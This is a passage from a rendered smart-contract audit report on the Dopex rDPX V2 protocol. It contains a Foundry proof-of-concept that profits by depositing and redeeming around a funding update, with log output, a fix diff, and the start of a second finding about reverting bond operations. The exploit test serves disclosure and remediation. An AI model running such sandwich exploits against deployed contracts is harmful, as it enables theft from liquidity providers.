class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;balance of eth before deposit and redeem:&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">balanceBefore</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vaultLp</span><span class=\"mtk1\">), </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vaultLp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vaultLp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">redeem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shares</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceAfter</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;balance after deposit and redeem:&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">balanceAfter</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;immediate profit :&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">balanceAfter</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">balanceBefore</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Run the test :</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge test --match-contract Unit --match-test testSandwichProvideFunding -vvv</span></span></code></pre>\n<p>Log Output :</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  balance of eth before deposit and redeem:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  18665279470073000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  balance after deposit and redeem:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  18665299797412715619861</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  immediate profit :</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  20327339715619861</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Move <code>perpetualAtlanticVault.updateFunding</code> before <code>previewDeposit</code> is calculated.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  function deposit(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 assets,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    address receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) public virtual returns (uint256 shares) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    perpetualAtlanticVault.updateFunding();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // Check for rounding error since we round down in previewDeposit.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    require((shares = previewDeposit(assets)) != 0, &quot;ZERO_SHARES&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    perpetualAtlanticVault.updateFunding();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // Need to transfer before minting or ERC777s could reenter.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    collateral.transferFrom(msg.sender, address(this), assets);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    _mint(receiver, shares);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    _totalCollateral += assets;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    emit Deposit(msg.sender, receiver, assets, shares);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/867#issuecomment-1734035693\">witherblock (Dopex) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Please bump this to high</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/867#issuecomment-1759390605\">Alex the Entreprenerd (Judge) increased severity to High</a></strong></p>\n<hr>\n<h2 id=\"h-06-bond-operations-will-always-revert-at-certain-time-when-putoptionsrequired-is-true\" style=\"position:relative;\"><a href=\"#h-06-bond-operations-will-always-revert-at-certain-time-when-putoptionsrequired-is-true\" aria-label=\"h 06 bond operations will always revert at certain time when putoptionsrequired is true permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/756\">[H-06] Bond operations will always revert at certain time when <code>putOptionsRequired</code> is true</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/756\">said</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L481-L483\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L481-L483</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L286\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L286</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L539-L551\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L539-L551</a></p>\n<p>when <code>putOptionsRequired</code> is <code>true</code>, there is period of time where bond operations will always revert when try to purchase options from perp atlantic vault.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When <code>bond</code> is called and <code>putOptionsRequired</code> is <code>true</code>, it will call <code>_purchaseOptions</code> providing the calculated <code>rdpxRequired</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L920-L922\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L920-L922</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">bond</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxBondId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiptTokenAmount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_whenNotPaused</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Validate amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_validate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Compute the bond cost</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">calculateBondCost</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">rdpxBondId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">weth</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">wethRequired</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// update weth reserve</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">reserveAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">reservesIndex</span><span class=\"mtk1\">[</span><span class=\"mtk8\">&quot;WETH&quot;</span><span class=\"mtk1\">]].</span><span class=\"mtk12\">tokenBalance</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// purchase options</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">premium</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">putOptionsRequired</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;   </span><span class=\"mtk12\">premium</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_purchaseOptions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">premium</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rdpxBondId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Stake the ETH in the ReceiptToken contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">receiptTokenAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_stake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// reLP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">isReLPActive</span><span class=\"mtk1\">) </span><span class=\"mtk11\">IReLP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">reLPContract</span><span class=\"mtk1\">).</span><span class=\"mtk11\">reLP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">LogBond</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">receiptTokenAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>Inside <code>_purchaseOptions</code>, it will call <code>PerpetualAtlanticVault.purchase</code> providing the amount and <code>address(this)</code> as receiver :</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L471-L487\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L471-L487</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_purchaseOptions</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">premium</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * Purchase options and store ERC721 option id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * Note that the amount of options purchased is the amount of rDPX received</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * from the user to sufficiently collateralize the underlying DpxEth stored in the bond</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     **/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">optionId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt; (</span><span class=\"mtk12\">premium</span><span class=\"mtk1\">, </span><span class=\"mtk12\">optionId</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">IPerpetualAtlanticVault</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">perpetualAtlanticVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ).</span><span class=\"mtk11\">purchase</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">optionsOwned</span><span class=\"mtk1\">[</span><span class=\"mtk12\">optionId</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">reserveAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">reservesIndex</span><span class=\"mtk1\">[</span><span class=\"mtk8\">&quot;WETH&quot;</span><span class=\"mtk1\">]].</span><span class=\"mtk12\">tokenBalance</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">premium</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>Then inside <code>purchase</code>, it will calculate <code>premium</code> using <code>calculatePremium</code> function, providing <code>strike</code>, <code>amount</code>, <code>timeToExpiry</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L286\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L286</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">purchase</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">nonReentrant</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">RDPXV2CORE_ROLE</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">premium</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_whenNotPaused</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_validate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">updateFunding</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getUnderlyingPrice</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// price of underlying wrt collateralToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strike</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">roundUp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">4</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// 25% below the current price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IPerpetualAtlanticVaultLP</span><span class=\"mtk1\"> </span><span class=\"mtk12\">perpetualAtlanticVaultLp</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPerpetualAtlanticVaultLP</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">perpetualAtlanticVaultLP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span 